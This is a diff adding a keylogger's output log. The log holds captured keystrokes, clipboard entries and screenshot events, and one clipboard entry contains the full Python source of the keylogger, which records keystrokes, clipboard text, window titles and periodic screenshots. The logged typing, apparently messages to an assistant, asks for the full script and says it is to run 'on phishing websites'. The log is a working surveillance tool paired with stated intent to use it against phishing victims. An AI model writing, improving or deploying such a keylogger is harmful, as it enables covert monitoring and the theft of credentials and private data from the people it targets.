@@ -1,0 +1,2237 @@
+[2026-11-04 22:49:59] INFO: WINDOW_FOCUS: 'Error getting window title: module 'ctypes' has no attribute 'windll''
+[2026-11-04 22:49:59] INFO: CLIPBOARD_UPDATED: 'python fruad_monitor.py'
+[2026-11-04 22:49:59] WARNING: This process is not trusted! Input event monitoring will not be possible until it is added to accessibility clients.
+[2026-11-04 22:51:34] INFO: WINDOW_FOCUS: 'Error getting window title: module 'ctypes' has no attribute 'windll''
+[2026-11-04 22:51:34] INFO: CLIPBOARD_UPDATED: 'cd /Users/Robbie/projects/keys
+.venv/bin/python fruad_monitor.py'
+[2026-11-04 22:51:34] WARNING: This process is not trusted! Input event monitoring will not be possible until it is added to accessibility clients.
+[2026-11-04 22:51:46] INFO: KEY_PRESS: 'g'
+[2026-11-04 22:51:46] INFO: KEY_PRESS: 'f'
+[2026-11-04 22:51:46] INFO: KEY_PRESS: 'd'
+[2026-11-04 22:51:46] INFO: KEY_PRESS: 'g'
+[2026-11-04 22:51:46] INFO: KEY_PRESS: 'f'
+[2026-11-04 22:51:46] INFO: KEY_PRESS: 'd'
+[2026-11-04 22:51:46] INFO: KEY_PRESS: 'g'
+[2026-11-04 22:51:47] INFO: KEY_PRESS: 'f'
+[2026-11-04 22:51:47] INFO: KEY_PRESS: 'd'
+[2026-11-04 22:51:47] INFO: KEY_PRESS: 'g'
+[2026-11-04 22:51:47] INFO: KEY_PRESS: 'f'
+[2026-11-04 22:51:47] INFO: KEY_PRESS: 'd'
+[2026-11-04 22:51:47] INFO: KEY_PRESS: 'g'
+[2026-11-04 22:51:47] INFO: KEY_PRESS: 'f'
+[2026-11-04 22:51:47] INFO: KEY_PRESS: 'd'
+[2026-11-04 22:52:22] INFO: KEY_PRESS: 'p'
+[2026-11-04 22:52:23] INFO: KEY_PRESS: 'h'
+[2026-11-04 22:52:23] INFO: KEY_PRESS: 'a'
+[2026-11-04 22:52:23] INFO: KEY_PRESS: 's'
+[2026-11-04 22:52:23] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:52:23] INFO: KEY_SPECIAL: space
+[2026-11-04 22:52:23] INFO: KEY_PRESS: '1'
+[2026-11-04 22:52:23] INFO: KEY_SPECIAL: space
+[2026-11-04 22:52:24] INFO: KEY_PRESS: 'c'
+[2026-11-04 22:52:24] INFO: KEY_PRESS: 'o'
+[2026-11-04 22:52:24] INFO: KEY_PRESS: 'm'
+[2026-11-04 22:52:24] INFO: KEY_PRESS: 'p'
+[2026-11-04 22:52:24] INFO: KEY_PRESS: 'l'
+[2026-11-04 22:52:24] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:52:24] INFO: KEY_PRESS: 't'
+[2026-11-04 22:52:25] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:52:25] INFO: KEY_PRESS: 'd'
+[2026-11-04 22:52:25] INFO: KEY_SPECIAL: space
+[2026-11-04 22:52:25] INFO: KEY_PRESS: 'a'
+[2026-11-04 22:52:25] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:52:25] INFO: KEY_PRESS: 'd'
+[2026-11-04 22:52:25] INFO: KEY_SPECIAL: space
+[2026-11-04 22:52:25] INFO: KEY_PRESS: 'v'
+[2026-11-04 22:52:25] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:52:26] INFO: KEY_PRESS: 'r'
+[2026-11-04 22:52:26] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:52:26] INFO: KEY_PRESS: 'f'
+[2026-11-04 22:52:26] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:52:26] INFO: KEY_PRESS: 'f'
+[2026-11-04 22:52:26] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:52:26] INFO: KEY_PRESS: 'd'
+[2026-11-04 22:52:26] INFO: KEY_SPECIAL: enter
+[2026-11-04 22:53:38] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 22:53:38] INFO: KEY_PRESS: 'I'
+[2026-11-04 22:53:38] INFO: KEY_SPECIAL: space
+[2026-11-04 22:53:39] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:53:39] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:53:39] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:53:39] INFO: KEY_PRESS: 'd'
+[2026-11-04 22:53:39] INFO: KEY_SPECIAL: space
+[2026-11-04 22:53:39] INFO: KEY_PRESS: 'y'
+[2026-11-04 22:53:39] INFO: KEY_PRESS: 'o'
+[2026-11-04 22:53:39] INFO: KEY_PRESS: 'u'
+[2026-11-04 22:53:39] INFO: KEY_SPECIAL: space
+[2026-11-04 22:53:39] INFO: KEY_PRESS: 't'
+[2026-11-04 22:53:40] INFO: KEY_PRESS: 'o'
+[2026-11-04 22:53:40] INFO: KEY_SPECIAL: space
+[2026-11-04 22:53:40] INFO: KEY_PRESS: 'g'
+[2026-11-04 22:53:40] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:53:40] INFO: KEY_PRESS: 'v'
+[2026-11-04 22:53:40] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:53:40] INFO: KEY_SPECIAL: space
+[2026-11-04 22:53:40] INFO: KEY_PRESS: 'm'
+[2026-11-04 22:53:41] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:53:41] INFO: KEY_PRESS: '3'
+[2026-11-04 22:53:41] INFO: KEY_SPECIAL: space
+[2026-11-04 22:53:41] INFO: KEY_PRESS: 't'
+[2026-11-04 22:53:41] INFO: KEY_PRESS: 'h'
+[2026-11-04 22:53:41] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:53:41] INFO: KEY_SPECIAL: space
+[2026-11-04 22:53:41] INFO: KEY_PRESS: 'f'
+[2026-11-04 22:53:41] INFO: KEY_PRESS: 'u'
+[2026-11-04 22:53:41] INFO: KEY_PRESS: 'l'
+[2026-11-04 22:53:41] INFO: KEY_PRESS: 'l'
+[2026-11-04 22:53:42] INFO: KEY_SPECIAL: space
+[2026-11-04 22:53:42] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:53:42] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:53:42] INFO: KEY_PRESS: 'w'
+[2026-11-04 22:53:42] INFO: KEY_SPECIAL: space
+[2026-11-04 22:53:42] INFO: KEY_PRESS: 's'
+[2026-11-04 22:53:42] INFO: KEY_PRESS: 'c'
+[2026-11-04 22:53:42] INFO: KEY_PRESS: 'r'
+[2026-11-04 22:53:43] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:53:43] INFO: KEY_PRESS: 'p'
+[2026-11-04 22:53:43] INFO: KEY_PRESS: 't'
+[2026-11-04 22:53:43] INFO: KEY_SPECIAL: enter
+[2026-11-04 22:54:47] INFO: CLIPBOARD_UPDATED: 'import pynput.keyboard
+import pyperclip
+import psutil
+import time
+import logging
+from datetime import datetime
+import threading
+import os
+from mss import mss
+from PIL import Image
+
+# --- CONFIGURATION ---
+LOG_FILE = "fraud_monitor_log.txt"
+SCREENSHOT_FOLDER = "Keylogger_Screenshots"
+CLIPBOARD_CHECK_INTERVAL = 1  # Check clipboard every 1 second
+WINDOW_CHECK_INTERVAL = 1    # Check window title every 1 second
+SCREENSHOT_INTERVAL = 30      # Take a screenshot every 30 seconds
+
+# --- SETUP ---
+try:
+    # Ensure the screenshot directory exists
+    os.makedirs(SCREENSHOT_FOLDER, exist_ok=True)
+except Exception as e:
+    print(f"Error creating screenshot directory: {e}")
+
+# --- LOGGING SETUP ---
+logging.basicConfig(filename=LOG_FILE, 
+                    level=logging.INFO, 
+                    format='[%(asctime)s] %(levelname)s: %(message)s', 
+                    datefmt='%Y-%m-%d %H:%M:%S')
+
+# --- GLOBAL STATE TRACKING ---
+last_clipboard = ""
+last_window_title = ""
+# Global to signal threads to stop cleanly
+stop_event = threading.Event()
+
+# --- HELPER FUNCTIONS ---
+
+def get_active_window_info():
+    """Retrieves the title of the currently active window (Windows specific)."""
+    try:
+        import ctypes
+        # Attempt to get foreground window handle
+        if ctypes.windll.user32.GetForegroundWindow():
+            hWnd = ctypes.windll.user32.GetForegroundWindow()
+            title = ctypes.windll.user32.GetWindowText(hWnd)
+            return title
+    except ImportError:
+        # Fallback if ctypes fails
+        return "ctypes_unavailable"
+    except Exception as e:
+        return f"Error fetching window title: {e}"
+    return "Unknown Application"
+
+# --- LAYER 1: KEYBOARD MONITORING ---
+def on_press(key):
+    """Captures keystrokes."""
+    try:
+        key_char = key.char
+        message = f"KEY_PRESS: '{key_char}'"
+        logging.info(message)
+        print(f"-> Pressed: {key_char}")
+    except AttributeError:
+        # Special keys (Shift, Ctrl, Space, etc.)
+        key_name = str(key).replace('Key.', '').replace('Key', '')
+        message = f"KEY_SPECIAL: {key_name}"
+        logging.info(message)
+        print(f"-> Special Pressed: {key_name}")
+
+def on_release(key):
+    """Handles exit condition."""
+    if key == pynput.keyboard.Key.esc:
+        print("\n[SYSTEM] Escape key pressed. Signalling shutdown...")
+        stop_event.set() # Signal all threads to stop
+        return False # Stops the listener
+
+# --- LAYER 1: CLIPBOARD MONITORING ---
+def monitor_clipboard():
+    """Periodically checks and logs the clipboard content."""
+    global last_clipboard
+    print("[Monitor] Clipboard monitoring thread started.")
+    while not stop_event.is_set():
+        try:
+            current_clipboard = pyperclip.paste()
+            if current_clipboard and current_clipboard != last_clipboard:
+                # Log only if new content is found
+                message = f"CLIPBOARD_UPDATED: '{current_clipboard}'"
+                logging.info(message)
+                print(f"\n*** CLIPBOARD CAPTURED: {current_clipboard} ***")
+                last_clipboard = current_clipboard
+            time.sleep(CLIPBOARD_CHECK_INTERVAL)
+        except Exception as e:
+            logging.error(f"Clipboard error: {e}")
+            time.sleep(CLIPBOARD_CHECK_INTERVAL)
+
+# --- LAYER 2: WINDOW TRACKER ---
+def window_tracker():
+    """Periodically checks and logs the active window context."""
+    global last_window_title
+    print("[Monitor] Window tracking thread started.")
+    while not stop_event.is_set():
+        current_title = get_active_window_info()
+
+        if current_title != last_window_title:
+            message = f"WINDOW_FOCUS: '{current_title}'"
+            logging.info(message)
+            print(f"\n--- Focus Shift Detected: {current_title} ---")
+            last_window_title = current_title
+
+        time.sleep(WINDOW_CHECK_INTERVAL)
+
+# --- LAYER 2: SCREENSHOT SERVICE ---
+def screenshot_service():
+    """Periodically captures and saves the screen."""
+    print("[Monitor] Screenshot service thread started.")
+    with mss() as sct:
+        while not stop_event.is_set():
+            try:
+                # Capture the entire screen
+                sct_img = sct.grab(sct.monitors[1]) # Assumes primary monitor is index 1
+
+                # Generate unique filename
+                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                filename = os.path.join(SCREENSHOT_FOLDER, f"capture_{timestamp}.png")
+
+                # Save image using PIL
+                img = Image.frombytes("RGB", sct_img.size, sct_img.rgb, "raw", "RGB")
+                img.save(filename)
+
+                # Log the successful capture to the master log
+                logging.info(f"SCREENSHOT_TAKEN: Image saved as {os.path.basename(filename)}")
+                print(f"\n--- Screenshot captured: {filename} ---")
+
+                # Wait until the next interval, but respect the stop signal
+                stop_event.wait(SCREENSHOT_INTERVAL) 
+
+            except Exception as e:
+                logging.error(f"Screenshot service error: {e}")
+                stop_event.wait(SCREENSHOT_INTERVAL) # Wait on error
+
+# --- MAIN EXECUTION ---
+if __name__ == "__main__":
+    print("="*60)
+    print("📡 DIG KEYLOGGER SYSTEM V2 ONLINE 📡")
+    print(f"Log output: {LOG_FILE}")
+    print(f"Image output: {SCREENSHOT_FOLDER}/")
+    print("Press 'Esc' key to shut down the system.")
+    print("="*60)
+
+    # 1. Start the background threads
+    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
+    clipboard_thread.start()
+
+    window_thread = threading.Thread(target=window_tracker, daemon=True)
+    window_thread.start()
+
+    screenshot_thread = threading.Thread(target=screenshot_service, daemon=True)
+    screenshot_thread.start()
+
+    # 2. Start the main keyboard listener thread
+    listener = pynput.keyboard.Listener(on_press=on_press, on_release=on_release)
+    listener.start()
+
+    # 3. Wait for the listener thread to finish (i.e., until Esc is pressed)
+    listener.join()
+
+    # Signal all daemon threads to clean up gracefully
+    stop_event.set() 
+    # Give threads a moment to finish their last loop iteration
+    time.sleep(2) 
+
+    print("\n" + "="*60)
+    print("✅ SYSTEM SHUTDOWN COMPLETE. Review logs and images.")
+    print("="*60)'
+[2026-11-04 22:55:25] INFO: KEY_PRESS: 'c'
+[2026-11-04 22:55:25] INFO: KEY_PRESS: 'd'
+[2026-11-04 22:55:26] INFO: KEY_SPECIAL: space
+[2026-11-04 22:55:26] INFO: KEY_PRESS: '.'
+[2026-11-04 22:55:26] INFO: KEY_PRESS: '.'
+[2026-11-04 22:55:26] INFO: KEY_SPECIAL: enter
+[2026-11-04 22:55:26] INFO: KEY_PRESS: 'c'
+[2026-11-04 22:55:26] INFO: KEY_PRESS: 'd'
+[2026-11-04 22:55:27] INFO: KEY_SPECIAL: space
+[2026-11-04 22:55:27] INFO: KEY_PRESS: 'k'
+[2026-11-04 22:55:27] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:55:27] INFO: KEY_PRESS: 'y'
+[2026-11-04 22:55:27] INFO: KEY_PRESS: 's'
+[2026-11-04 22:55:28] INFO: KEY_SPECIAL: enter
+[2026-11-04 22:55:34] INFO: CLIPBOARD_UPDATED: 'cd /Users/Robbie/projects/keys
+.venv/bin/python fruad_monitor.py'
+[2026-11-04 22:55:37] INFO: KEY_SPECIAL: cmd
+[2026-11-04 22:55:37] INFO: KEY_PRESS: 'v'
+[2026-11-04 22:55:38] INFO: KEY_SPECIAL: enter
+[2026-11-04 22:55:41] INFO: CLIPBOARD_UPDATED: 'cd /Users/Robbie/projects/keys
+.venv/bin/python fruad_monitor.py
+Traceback (most recent call last):
+  File "/Users/Robbie/projects/keys/fruad_monitor.py", line 10, in <module>
+    from mss import mss
+ModuleNotFoundError: No module named 'mss''
+[2026-11-04 22:55:44] INFO: KEY_SPECIAL: cmd
+[2026-11-04 22:55:44] INFO: KEY_PRESS: 'v'
+[2026-11-04 22:55:45] INFO: KEY_SPECIAL: enter
+[2026-11-04 22:56:08] INFO: CLIPBOARD_UPDATED: '.venv/bin/python -m pip install mss
+.venv/bin/python fruad_monitor.py'
+[2026-11-04 22:56:11] INFO: KEY_SPECIAL: cmd
+[2026-11-04 22:56:11] INFO: KEY_PRESS: 'v'
+[2026-11-04 22:56:11] INFO: KEY_SPECIAL: enter
+[2026-11-04 22:56:16] INFO: CLIPBOARD_UPDATED: 'Collecting mss
+  Downloading mss-10.2.0-py3-none-any.whl.metadata (7.2 kB)
+Downloading mss-10.2.0-py3-none-any.whl (67 kB)
+Installing collected packages: mss
+Successfully installed mss-10.2.0
+Traceback (most recent call last):
+  File "/Users/Robbie/projects/keys/fruad_monitor.py", line 11, in <module>
+    from PIL import Image
+ModuleNotFoundErro'
+[2026-11-04 22:56:17] INFO: CLIPBOARD_UPDATED: 'nv/bin/python fruad_monitor.py
+Collecting mss
+  Downloading mss-10.2.0-py3-none-any.whl.metadata (7.2 kB)
+Downloading mss-10.2.0-py3-none-any.whl (67 kB)
+Installing collected packages: mss
+Successfully installed mss-10.2.0
+Traceback (most recent call last):
+  File "/Users/Robbie/projects/keys/fruad_monitor.py", line 11, in <module>
+    from PIL import Image
+ModuleNotFoundError: No module named 'PIL''
+[2026-11-04 22:56:20] INFO: CLIPBOARD_UPDATED: '.venv/bin/python -m pip install mss
+.venv/bin/python fruad_monitor.py
+Collecting mss
+  Downloading mss-10.2.0-py3-none-any.whl.metadata (7.2 kB)
+Downloading mss-10.2.0-py3-none-any.whl (67 kB)
+Installing collected packages: mss
+Successfully installed mss-10.2.0
+Traceback (most recent call last):
+  File "/Users/Robbie/projects/keys/fruad_monitor.py", line 11, in <module>
+    from PIL import Image
+ModuleNotFoundError: No module named 'PIL''
+[2026-11-04 22:56:22] INFO: KEY_SPECIAL: cmd
+[2026-11-04 22:56:40] INFO: WINDOW_FOCUS: 'Error fetching window title: module 'ctypes' has no attribute 'windll''
+[2026-11-04 22:56:40] INFO: CLIPBOARD_UPDATED: '.venv/bin/python -m pip install Pillow
+.venv/bin/python fruad_monitor.py'
+[2026-11-04 22:56:41] WARNING: This process is not trusted! Input event monitoring will not be possible until it is added to accessibility clients.
+[2026-11-04 22:56:41] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_225640.png
+[2026-11-04 22:56:55] INFO: WINDOW_FOCUS: 'Error fetching window title: module 'ctypes' has no attribute 'windll''
+[2026-11-04 22:56:55] INFO: CLIPBOARD_UPDATED: '.venv/bin/python -m pip install Pillow
+.venv/bin/python fruad_monitor.py'
+[2026-11-04 22:56:55] WARNING: This process is not trusted! Input event monitoring will not be possible until it is added to accessibility clients.
+[2026-11-04 22:56:55] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_225655.png
+[2026-11-04 22:57:23] INFO: KEY_PRESS: 'g'
+[2026-11-04 22:57:23] INFO: KEY_PRESS: 'f'
+[2026-11-04 22:57:23] INFO: KEY_PRESS: 'd'
+[2026-11-04 22:57:23] INFO: KEY_PRESS: 'g'
+[2026-11-04 22:57:23] INFO: KEY_PRESS: 'f'
+[2026-11-04 22:57:23] INFO: KEY_PRESS: 'd'
+[2026-11-04 22:57:25] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_225725.png
+[2026-11-04 22:57:47] INFO: KEY_PRESS: 'c'
+[2026-11-04 22:57:47] INFO: KEY_PRESS: 'a'
+[2026-11-04 22:57:47] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:57:48] INFO: KEY_SPECIAL: space
+[2026-11-04 22:57:48] INFO: KEY_PRESS: 'c'
+[2026-11-04 22:57:48] INFO: KEY_PRESS: 'o'
+[2026-11-04 22:57:48] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:57:48] INFO: KEY_PRESS: 'f'
+[2026-11-04 22:57:48] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:57:48] INFO: KEY_PRESS: 'r'
+[2026-11-04 22:57:48] INFO: KEY_PRESS: 'm'
+[2026-11-04 22:57:49] INFO: KEY_SPECIAL: space
+[2026-11-04 22:57:50] INFO: KEY_PRESS: 'p'
+[2026-11-04 22:57:51] INFO: KEY_PRESS: 'h'
+[2026-11-04 22:57:51] INFO: KEY_PRESS: 'a'
+[2026-11-04 22:57:51] INFO: KEY_PRESS: 's'
+[2026-11-04 22:57:51] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:57:51] INFO: KEY_SPECIAL: space
+[2026-11-04 22:57:51] INFO: KEY_PRESS: '2'
+[2026-11-04 22:57:51] INFO: KEY_SPECIAL: space
+[2026-11-04 22:57:52] INFO: KEY_PRESS: 'c'
+[2026-11-04 22:57:52] INFO: KEY_PRESS: 'o'
+[2026-11-04 22:57:52] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:57:52] INFO: KEY_PRESS: 'f'
+[2026-11-04 22:57:52] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:57:52] INFO: KEY_PRESS: 'r'
+[2026-11-04 22:57:52] INFO: KEY_PRESS: 'm'
+[2026-11-04 22:57:52] INFO: KEY_PRESS: 'a'
+[2026-11-04 22:57:52] INFO: KEY_PRESS: 't'
+[2026-11-04 22:57:52] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:57:53] INFO: KEY_PRESS: 'o'
+[2026-11-04 22:57:53] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:57:53] INFO: KEY_PRESS: 'm'
+[2026-11-04 22:57:56] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_225755.png
+[2026-11-04 22:58:26] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_225826.png
+[2026-11-04 22:58:56] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_225856.png
+[2026-11-04 22:58:57] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 22:58:57] INFO: KEY_PRESS: 'O'
+[2026-11-04 22:58:57] INFO: KEY_PRESS: 'p'
+[2026-11-04 22:58:58] INFO: KEY_PRESS: 't'
+[2026-11-04 22:58:58] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:58:58] INFO: KEY_PRESS: 'o'
+[2026-11-04 22:58:58] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:58:58] INFO: KEY_SPECIAL: space
+[2026-11-04 22:58:58] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 22:58:59] INFO: KEY_PRESS: 'B'
+[2026-11-04 22:58:59] INFO: KEY_SPECIAL: enter
+[2026-11-04 22:59:26] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_225926.png
+[2026-11-04 22:59:46] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 22:59:46] INFO: KEY_PRESS: 'I'
+[2026-11-04 22:59:46] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:46] INFO: KEY_PRESS: 'j'
+[2026-11-04 22:59:46] INFO: KEY_PRESS: 'u'
+[2026-11-04 22:59:46] INFO: KEY_PRESS: 's'
+[2026-11-04 22:59:47] INFO: KEY_PRESS: 't'
+[2026-11-04 22:59:47] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:47] INFO: KEY_PRESS: 'w'
+[2026-11-04 22:59:47] INFO: KEY_PRESS: 'a'
+[2026-11-04 22:59:47] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:59:47] INFO: KEY_PRESS: 't'
+[2026-11-04 22:59:47] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:47] INFO: KEY_PRESS: 't'
+[2026-11-04 22:59:47] INFO: KEY_PRESS: 'o'
+[2026-11-04 22:59:47] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:48] INFO: KEY_PRESS: 'm'
+[2026-11-04 22:59:48] INFO: KEY_PRESS: 'a'
+[2026-11-04 22:59:48] INFO: KEY_PRESS: 'k'
+[2026-11-04 22:59:48] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:59:48] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:48] INFO: KEY_PRESS: 't'
+[2026-11-04 22:59:48] INFO: KEY_PRESS: 'h'
+[2026-11-04 22:59:48] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:59:48] INFO: KEY_PRESS: 's'
+[2026-11-04 22:59:49] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:49] INFO: KEY_PRESS: 'c'
+[2026-11-04 22:59:49] INFO: KEY_PRESS: 'l'
+[2026-11-04 22:59:49] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:59:49] INFO: KEY_PRESS: 'a'
+[2026-11-04 22:59:49] INFO: KEY_PRESS: 'r'
+[2026-11-04 22:59:49] INFO: KEY_PRESS: ','
+[2026-11-04 22:59:49] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:49] INFO: KEY_PRESS: 'w'
+[2026-11-04 22:59:50] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:59:50] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:50] INFO: KEY_PRESS: 'a'
+[2026-11-04 22:59:50] INFO: KEY_PRESS: 'r'
+[2026-11-04 22:59:50] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:59:50] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:50] INFO: KEY_PRESS: 'g'
+[2026-11-04 22:59:50] INFO: KEY_PRESS: 'o'
+[2026-11-04 22:59:50] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:59:51] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:59:51] INFO: KEY_PRESS: 'g'
+[2026-11-04 22:59:51] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:51] INFO: KEY_PRESS: 't'
+[2026-11-04 22:59:51] INFO: KEY_PRESS: 'o'
+[2026-11-04 22:59:51] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:51] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:59:51] INFO: KEY_PRESS: 'm'
+[2026-11-04 22:59:51] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:59:51] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:59:51] INFO: KEY_PRESS: 'd'
+[2026-11-04 22:59:52] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:52] INFO: KEY_PRESS: 't'
+[2026-11-04 22:59:52] INFO: KEY_PRESS: 'o'
+[2026-11-04 22:59:52] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:52] INFO: KEY_PRESS: 'b'
+[2026-11-04 22:59:52] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:59:52] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:52] INFO: KEY_PRESS: 'r'
+[2026-11-04 22:59:53] INFO: KEY_PRESS: 'u'
+[2026-11-04 22:59:53] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:59:53] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:59:53] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:59:53] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:59:53] INFO: KEY_PRESS: 'g'
+[2026-11-04 22:59:53] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:53] INFO: KEY_PRESS: 't'
+[2026-11-04 22:59:53] INFO: KEY_PRESS: 'h'
+[2026-11-04 22:59:54] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:59:54] INFO: KEY_PRESS: 's'
+[2026-11-04 22:59:54] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:54] INFO: KEY_PRESS: 'o'
+[2026-11-04 22:59:54] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:59:54] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:55] INFO: KEY_PRESS: 'p'
+[2026-11-04 22:59:55] INFO: KEY_PRESS: 'h'
+[2026-11-04 22:59:55] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:59:55] INFO: KEY_PRESS: 's'
+[2026-11-04 22:59:56] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:59:56] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:59:56] INFO: KEY_PRESS: 'g'
+[2026-11-04 22:59:56] INFO: KEY_SPECIAL: space
+[2026-11-04 22:59:56] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_225956.png
+[2026-11-04 22:59:56] INFO: KEY_PRESS: 'w'
+[2026-11-04 22:59:56] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:59:56] INFO: KEY_PRESS: 'b'
+[2026-11-04 22:59:56] INFO: KEY_PRESS: 'n'
+[2026-11-04 22:59:56] INFO: KEY_PRESS: 's'
+[2026-11-04 22:59:56] INFO: KEY_PRESS: 'i'
+[2026-11-04 22:59:57] INFO: KEY_PRESS: 't'
+[2026-11-04 22:59:57] INFO: KEY_PRESS: 'e'
+[2026-11-04 22:59:57] INFO: KEY_PRESS: 's'
+[2026-11-04 22:59:57] INFO: KEY_SPECIAL: space
+[2026-11-04 23:00:26] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230026.png
+[2026-11-04 23:00:56] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230056.png
+[2026-11-04 23:00:57] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:00:57] INFO: KEY_PRESS: 'A'
+[2026-11-04 23:01:26] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230126.png
+[2026-11-04 23:01:56] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230156.png
+[2026-11-04 23:02:03] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:02:03] INFO: KEY_PRESS: 'Y'
+[2026-11-04 23:02:04] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:02:04] INFO: KEY_PRESS: 's'
+[2026-11-04 23:02:04] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:02:26] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230226.png
+[2026-11-04 23:02:48] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:02:49] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:49] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:02:49] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:02:49] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:02:49] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:02:49] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:49] INFO: KEY_PRESS: 't'
+[2026-11-04 23:02:49] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:02:50] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:50] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:02:50] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:02:50] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:02:50] INFO: KEY_PRESS: 'k'
+[2026-11-04 23:02:50] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:50] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:02:50] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:02:50] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:51] INFO: KEY_PRESS: 't'
+[2026-11-04 23:02:51] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:02:51] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:02:51] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:02:51] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:52] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:02:52] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:02:52] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:02:52] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:02:52] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:02:52] INFO: KEY_SPECIAL: space
+[2026-11-04 23:02:52] INFO: KEY_PRESS: 's'
